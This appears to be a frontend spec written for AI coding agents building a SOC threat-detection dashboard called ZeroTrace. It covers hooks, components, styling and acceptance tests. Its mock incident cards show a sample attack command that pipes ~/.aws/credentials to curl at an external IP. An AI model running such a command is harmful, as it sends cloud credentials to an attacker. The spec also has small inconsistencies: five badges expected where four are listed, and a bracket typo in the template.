# ZeroTrace — Frontend PRD
# For AI agents building `frontend/`
> Version: 1.0 | Date: 2026-10-17
> Read `.antigravityiderules` and `agent/CONTEXT.md` before coding anything.

---

## 0. What You Are Building

A **Next.js 15 App Router** single-page SOC dashboard that:
1. Connects to the backend via **Server-Sent Events** and displays threat incidents in real time.
2. Shows a **score badge**, **reasoning trail**, and **MITRE ATT&CK technique badges** for each incident.
3. Provides a one-click **"Isolate Process & Block Egress"** button that calls `POST /api/contain`.
4. Generates and downloads a **developer post-mortem Markdown file**.
5. Shows a **connection status indicator** and **health banner** for Ollama status.

**Design target:** Dark-mode SOC aesthetic. Premium, not minimal. Analysts must feel this is production-grade.

---

## 1. Directory Layout (create exactly this)

```
frontend/
├── package.json
├── tsconfig.json
├── next.config.ts
├── tailwind.config.ts
├── postcss.config.js
├── .env.local.example
└── src/
    ├── app/
    │   ├── layout.tsx          ← Root layout: dark bg, font, metadata
    │   ├── page.tsx            ← Main dashboard page (single route)
    │   └── globals.css         ← Tailwind base + custom CSS variables
    ├── components/
    │   ├── StatusBanner.tsx    ← Connection + Ollama health status bar
    │   ├── ScenarioControls.tsx ← "Simulate Zero-Day" and "Simulate Benign" buttons
    │   ├── IncidentFeed.tsx    ← List of incident cards
    │   ├── IncidentCard.tsx    ← Single incident: score, verdict, process info
    │   ├── ReasoningTrail.tsx  ← Expandable reasoning steps
    │   ├── MitreBadges.tsx     ← Clickable MITRE ATT&CK technique badges
    │   ├── ContainmentButton.tsx ← "Isolate Process" CTA
    │   └── PostmortemExport.tsx  ← "Export Post-Mortem" download button
    └── hooks/
        ├── useZeroTrace.ts     ← SSE connection + state management
        └── useHealth.ts        ← Polls GET /api/health every 10 s
```

---

## 2. package.json

```json
{
  "name": "zerotrace-frontend",
  "version": "1.0.0",
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start"
  },
  "dependencies": {
    "lucide-react": "^0.441.0",
    "next": "15.0.0",
    "react": "^18.3.0",
    "react-dom": "^18.3.0"
  },
  "devDependencies": {
    "@types/node": "^20.0.0",
    "@types/react": "^18.3.0",
    "@types/react-dom": "^18.3.0",
    "autoprefixer": "^10.4.20",
    "postcss": "^8.4.47",
    "tailwindcss": "^3.4.13",
    "typescript": "^5.3.0"
  }
}
```

---

## 3. .env.local.example

```
NEXT_PUBLIC_API_URL=http://localhost:5001
```

---

## 4. Design System

### Color Palette
```css
/* globals.css — CSS variables */
--bg-base:       #0a0e1a;   /* near-black navy — main background */
--bg-surface:    #111827;   /* card/panel background */
--bg-surface-2:  #1a2235;   /* hover state, nested panels */
--border:        #1e2d45;   /* subtle borders */
--text-primary:  #e2e8f0;   /* main text */
--text-muted:    #64748b;   /* secondary text */
--accent-blue:   #3b82f6;   /* interactive elements */

/* Verdict colors */
--safe:          #22c55e;   /* green */
--suspicious:    #f59e0b;   /* amber */
--critical:      #ef4444;   /* red */
--contained:     #6366f1;   /* indigo */
```

### Typography
Import **Inter** from Google Fonts in `layout.tsx`.
```html
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
```
Use `JetBrains Mono` for command lines and PID values.

### Animations (Tailwind classes + custom CSS)
- Incident card slide-in: `animate-slide-in` (translate-y from 20px, opacity 0→1, 300ms ease-out)
- Score counter: animate from 0 to final value over 800ms with easing
- CRITICAL badge pulse: `animate-pulse` on the red border
- Containment flip: status badge cross-fade (300ms)

Add these in `globals.css`:
```css
@keyframes slide-in {
  from { transform: translateY(20px); opacity: 0; }
  to   { transform: translateY(0);    opacity: 1; }
}
.animate-slide-in { animation: slide-in 0.3s ease-out forwards; }
```

---

## 5. `src/hooks/useZeroTrace.ts` — Full Spec

```typescript
'use client'

// State shape:
interface ZeroTraceState {
  connectionStatus: 'connecting' | 'connected' | 'disconnected';
  incidents: StoredIncidentView[];   // ordered newest-first
  activeBreachId: string | null;     // incidentId of current BREACH incident
}

// StoredIncidentView mirrors IncidentEvent + posture
interface StoredIncidentView {
  incidentId: string;
  process: ProcessInfo;
  result: ZeroTraceModelResponse;
  isFallback: boolean;
  detectedAt: string;
  posture: 'ANALYZING' | 'CLEAR' | 'BREACH' | 'CONTAINED';
}

// Hook return type:
interface UseZeroTraceReturn extends ZeroTraceState {
  simulateAttack: (scenario: string) => Promise<void>;
  contain: (incidentId: string) => Promise<void>;
}
```

### SSE Connection Logic
```
1. Create EventSource(`${NEXT_PUBLIC_API_URL}/api/stream`) in useEffect
2. Set connectionStatus = 'connecting' initially
3. EventSource.onopen → connectionStatus = 'connected'
4. EventSource.onerror → connectionStatus = 'disconnected', schedule reconnect in 3000ms
5. EventSource.onmessage → parse JSON, dispatch to handlers:
   - 'connected' → connectionStatus = 'connected'
   - 'incident'  → add to incidents (newest first), set posture='BREACH' if score>=40 else 'CLEAR', set activeBreachId
   - 'containment' → update matching incident posture to 'CONTAINED', clear activeBreachId
6. Cleanup: eventSource.close() on unmount, clear reconnect timer
```

### `simulateAttack(scenario: string)`
```
POST ${NEXT_PUBLIC_API_URL}/api/simulate-attack
Body: { scenario }
No state change here — state comes via SSE
Throws on non-2xx
```

### `contain(incidentId: string)`
```
POST ${NEXT_PUBLIC_API_URL}/api/contain
Body: { incidentId }
No state change here — state comes via SSE containment event
Throws on non-2xx, catches 409 and shows toast
```

---

## 6. `src/hooks/useHealth.ts` — Full Spec

```typescript
// Polls GET /api/health every 10 seconds
// Returns: { ollamaReachable: boolean; modelPulled: boolean; status: 'ok'|'degraded' }
// On fetch error: returns { ollamaReachable: false, modelPulled: false, status: 'degraded' }
```

---

## 7. `src/app/layout.tsx` — Full Spec

```tsx
export const metadata = {
  title: 'ZeroTrace — Zero-Day Behavioral Detection',
  description: 'Real-time SOC dashboard for detecting zero-day attacks using behavioral AI reasoning',
}

// Body: className="bg-[#0a0e1a] text-[#e2e8f0] font-inter antialiased"
// Include Google Fonts link tags
// Wrap children in a full-height div
```

---

## 8. `src/app/page.tsx` — Full Spec

```tsx
'use client'

// Layout: full-viewport dark page
// Structure:
//   <header> — ZeroTrace logo (shield icon from Lucide), title, connection dot
//   <main>
//     <StatusBanner />     ← top of page, full-width
//     <ScenarioControls /> ← centered, two buttons
//     <IncidentFeed />     ← list of IncidentCards, takes remaining height
```

---

## 9. `src/components/StatusBanner.tsx` — Full Spec

Props: `{ connectionStatus, ollamaReachable, modelPulled }`

Renders a full-width bar at the top (below header).

| State | Color | Icon | Text |
|-------|-------|------|------|
| SSE connected + Ollama ok | green border | `Wifi` | "Live · Connected · Model Ready" |
| SSE connected + Ollama degraded | amber border | `AlertTriangle` | "⚠️ Ollama offline — demo mode active" |
| SSE disconnected | red border | `WifiOff` | "Disconnected — reconnecting…" |

No spinner — use a subtle pulsing dot for "live" state.

---

## 10. `src/components/ScenarioControls.tsx` — Full Spec

Props: `{ onSimulate: (scenario: string) => void; isAnalyzing: boolean }`

Renders two buttons side-by-side, centered:

```
[ 🧨 Simulate Zero-Day Attack ]   [ ✅ Simulate Benign Activity ]
```

- Left button: `scenario = "zero-day"`, red accent border on hover
- Right button: `scenario = "benign"`, green accent border on hover
- Both disabled + show spinner when `isAnalyzing = true`
- Add a secondary row: `[ ⚠️ Borderline Deploy ]  [ 💻 Borderline Bash ]` (smaller, secondary style)

---

## 11. `src/components/IncidentCard.tsx` — Full Spec

Props: `{ incident: StoredIncidentView; onContain: () => void; onExport: () => void }`

Visual structure (card with dark surface, subtle border):

```
┌─────────────────────────────────────────────────────────────┐
│  [SCORE BADGE: 96]  CRITICAL BREACH          [⚡ Demo Mode] │
│  PID 31337 · npm (4821) · developer                         │
│  /bin/sh -c "cat ~/.aws/credentials | curl..."  [truncated] │
│  198.51.100.4:8443                                          │
│                                                             │
│  [Reasoning Trail accordion ▼]                              │
│  [MITRE badges: T1059.004  T1195.002  T1552.001  T1048]    │
│                                                             │
│  [🔴 Isolate Process (PID 31337) & Block Egress]            │
│  [📄 Export Post-Mortem]                                    │
└─────────────────────────────────────────────────────────────┘
```

**Score badge:**
- 0–39: green background, `SAFE`
- 40–74: amber background, `SUSPICIOUS`
- 75–100: red background, `CRITICAL`, animated pulse border
- Contained: indigo background, `CONTAINED`

**Score counter animation:** count from 0 to `threatScore` over 800ms on card mount.

**Command line:** truncated at 80 chars with `title` attribute for full text. Use `JetBrains Mono` font.

**Demo fallback badge:** If `isFallback === true`, show small `⚡ Demo` badge in top-right corner.

**Posture overlay:** When `posture === 'CONTAINED'`, overlay a semi-transparent indigo tint with "✓ CONTAINED" centered text in large font.

---

## 12. `src/components/ReasoningTrail.tsx` — Full Spec

Props: `{ steps: string[]; defaultOpen?: boolean }`

- Renders as an accordion/collapsible section titled **"Reasoning Trail"** with a `ChevronDown` icon.
- Each step is a numbered row:
  ```
  ① Shell spawned by npm — supply-chain indicator...
  ② AWS credentials file accessed...
  ③ Data piped to curl targeting non-RFC1918 IP...
  ```
- Step number circle: colored dot (red for critical signals, amber for suspicious, grey for neutral).
- Default `defaultOpen={true}` when `posture === 'BREACH'`.

---

## 13. `src/components/MitreBadges.tsx` — Full Spec

Props: `{ techniques: string[] }`

- Renders a horizontal flex row of pill badges.
- Each badge: `T1059.004` in monospace, dark background, blue border.
- Each badge is an `<a href={`https://attack.mitre.org/techniques/${id.replace('.','/')}`} target="_blank" rel="noopener">` 
  where the ID `T1059.004` maps to URL path `T1059/004`.
- On hover: blue background, white text, slight scale transform.
- Empty array → renders nothing.

---

## 14. `src/components/ContainmentButton.tsx` — Full Spec

Props: `{ pid: number; isEnabled: boolean; isContained: boolean; onClick: () => void; isLoading: boolean }`

```
Enabled state (verdict CRITICAL, posture BREACH):
  Red button, full width:
  "🔴 Isolate Process (PID {pid}) & Block Egress"
  Hover: brighter red, slight scale-up

Loading state:
  Spinner + "Containing…"

Contained state:
  Indigo button, non-clickable:
  "✓ Contained — PID {pid} Isolated"

Disabled state (SAFE/SUSPICIOUS or already submitted):
  Grey, cursor-not-allowed, tooltip: "Only available for CRITICAL incidents"
```

---

## 15. `src/components/PostmortemExport.tsx` — Full Spec

Props: `{ incident: StoredIncidentView; isVisible: boolean }`

Renders "📄 Export Post-Mortem" button (secondary style, visible only when incident exists).

On click, generate and download a `.md` file:

```markdown
# [title from developerPostmortem]

**Incident ID:** {incidentId}
**Detected At:** {detectedAt}
**Severity:** {severity}
**Score:** {threatScore} / 100 — {verdict}

---

## Description

{description}

---

## Action Items

- {actionItems[0]}
- {actionItems[1]}
...

---

## MITRE ATT&CK Techniques

{mitreTechniques.map(t => `- [${t}](https://attack.mitre.org/techniques/${t.replace('.','/'})`).join('\n')}

---

## Remediation

{remediation}

---

*Generated by ZeroTrace on {new Date().toISOString()}*
```

Download via: `URL.createObjectURL(new Blob([content], { type: 'text/markdown' }))` with `<a download="postmortem-{incidentId}.md">`.

---

## 16. `src/components/IncidentFeed.tsx` — Full Spec

Props: `{ incidents: StoredIncidentView[]; activeBreachId: string | null; onContain: (id: string) => void }`

- Renders a scrollable vertical list of `IncidentCard` components.
- Newest incident at the **top**.
- Auto-scrolls to top when a new incident is added.
- Empty state: centered text "No incidents yet. Click a scenario to begin." with a shield icon.
- Max height: `calc(100vh - 280px)`, `overflow-y: auto`.

---

## 17. `src/app/globals.css` — Required Contents

```css
@tailwind base;
@tailwind components;
@tailwind utilities;

@layer base {
  :root {
    --bg-base: #0a0e1a;
    --bg-surface: #111827;
    --bg-surface-2: #1a2235;
    --border: #1e2d45;
    --text-primary: #e2e8f0;
    --text-muted: #64748b;
    --accent-blue: #3b82f6;
    --safe: #22c55e;
    --suspicious: #f59e0b;
    --critical: #ef4444;
    --contained: #6366f1;
  }

  body {
    background-color: var(--bg-base);
    color: var(--text-primary);
    font-family: 'Inter', sans-serif;
  }

  /* Scrollbar styling */
  ::-webkit-scrollbar { width: 6px; }
  ::-webkit-scrollbar-track { background: var(--bg-base); }
  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
}

@keyframes slide-in {
  from { transform: translateY(20px); opacity: 0; }
  to   { transform: translateY(0);    opacity: 1; }
}

@keyframes count-up {
  from { opacity: 0.3; }
  to   { opacity: 1; }
}

.animate-slide-in    { animation: slide-in 0.3s ease-out forwards; }
.font-mono-code      { font-family: 'JetBrains Mono', monospace; }
.verdict-critical    { color: var(--critical); }
.verdict-suspicious  { color: var(--suspicious); }
.verdict-safe        { color: var(--safe); }
.verdict-contained   { color: var(--contained); }
```

---

## 18. `tailwind.config.ts` — Required Contents

```typescript
import type { Config } from 'tailwindcss'

const config: Config = {
  content: ['./src/**/*.{js,ts,jsx,tsx,mdx}'],
  theme: {
    extend: {
      colors: {
        base:       '#0a0e1a',
        surface:    '#111827',
        'surface-2':'#1a2235',
        border:     '#1e2d45',
        safe:       '#22c55e',
        suspicious: '#f59e0b',
        critical:   '#ef4444',
        contained:  '#6366f1',
      },
      fontFamily: {
        inter: ['Inter', 'sans-serif'],
        mono:  ['JetBrains Mono', 'monospace'],
      },
      animation: {
        'slide-in': 'slide-in 0.3s ease-out forwards',
      },
      keyframes: {
        'slide-in': {
          from: { transform: 'translateY(20px)', opacity: '0' },
          to:   { transform: 'translateY(0)',    opacity: '1' },
        },
      },
    },
  },
  plugins: [],
}

export default config
```

---

## 19. next.config.ts

```typescript
import type { NextConfig } from 'next'

const config: NextConfig = {
  reactStrictMode: true,
}

export default config
```

---

## 20. Page Layout Wireframe

```
┌──────────────────────────────────────────────────────────────┐
│  🛡 ZeroTrace     Zero-Day Behavioral Detection     🟢 Live  │  ← header
├──────────────────────────────────────────────────────────────┤
│  ⚡ Live · Connected · Model Ready                           │  ← StatusBanner
├──────────────────────────────────────────────────────────────┤
│                                                              │
│   [🧨 Simulate Zero-Day Attack]  [✅ Simulate Benign]        │  ← ScenarioControls
│     [⚠️ Borderline Deploy]  [💻 Borderline Bash]            │
│                                                              │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌────────────────────────────────────────────────────────┐  │
│  │  [96] CRITICAL BREACH                      [⚡ Demo]  │  │
│  │  PID 31337 · npm (4821) · developer                   │  │
│  │  /bin/sh -c "cat ~/.aws/credentials | curl..."        │  │
│  │  → 198.51.100.4:8443                                  │  │
│  │  ▼ Reasoning Trail                                    │  │  ← IncidentCard
│  │    ① Shell spawned by npm...                          │  │
│  │    ② AWS credentials read...                          │  │
│  │    ③ Data piped to curl at external IP...             │  │
│  │  [T1059.004] [T1195.002] [T1552.001] [T1048]         │  │
│  │  [🔴 Isolate Process (PID 31337) & Block Egress]      │  │
│  │  [📄 Export Post-Mortem]                              │  │
│  └────────────────────────────────────────────────────────┘  │
│                                                              │
│  ┌────────────────────────────────────────────────────────┐  │
│  │  [4] SAFE                                             │  │  ← Second card
│  │  PID 1234 · systemd (1) · www-data                   │  │
│  └────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────┘
```

---

## 21. Acceptance Criteria

| # | Test | Pass condition |
|---|------|----------------|
| AC-1 | Page loads at `localhost:3000` | Dark background, ZeroTrace title, no console errors |
| AC-2 | SSE connects | Green dot visible in header within 1 s |
| AC-3 | Click "Simulate Zero-Day" | Card appears with score 96, CRITICAL badge pulsing |
| AC-4 | Score counter | Animates from 0 → 96 on card mount |
| AC-5 | Reasoning trail | Accordion open by default for CRITICAL, shows ≥ 3 steps |
| AC-6 | MITRE badges | All 5 badges clickable, open correct attack.mitre.org URLs |
| AC-7 | Containment button | Enabled for CRITICAL, disabled for SAFE |
| AC-8 | Click "Isolate Process" | Status badge flips to CONTAINED (indigo), card tint appears |
| AC-9 | Export Post-Mortem | Downloads `.md` file with correct content |
| AC-10 | Simulate Benign | Score 4, SAFE badge (green), containment button disabled |
| AC-11 | Ollama offline | Amber banner "⚠️ Ollama offline — demo mode active" |
| AC-12 | SSE drops | Red dot, auto-reconnects within 3 s |
| AC-13 | Responsive | No horizontal scroll at 1080×768 |
